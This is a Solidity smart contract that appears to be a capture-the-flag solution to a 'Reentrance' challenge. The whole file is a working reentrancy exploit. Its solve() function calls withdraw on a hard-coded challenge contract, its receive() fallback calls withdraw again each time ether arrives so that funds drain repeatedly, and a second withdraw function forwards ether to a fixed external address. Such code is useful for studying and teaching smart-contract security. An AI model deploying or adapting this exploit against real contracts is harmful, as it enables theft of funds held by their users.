// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Reentrance {
    function withdraw(uint256 _amount) external;
}

contract Solve {
    address payable challengeContractAddr =
        payable(0xf3Fcc89057FF7e1fF6d7248496a9621FE7d42F55);
    Reentrance challengeContract = Reentrance(challengeContractAddr);

    function solve() public payable {
        challengeContract.withdraw(1000000000000000);
    }

    function withdraw(uint256 _amount) public {
        payable(0x940BCF526Ee4F346771b9dA31aa6736eb8B822a5).transfer(_amount);
    }

    receive() external payable {
        challengeContract.withdraw(1000000000000000);
    }
}
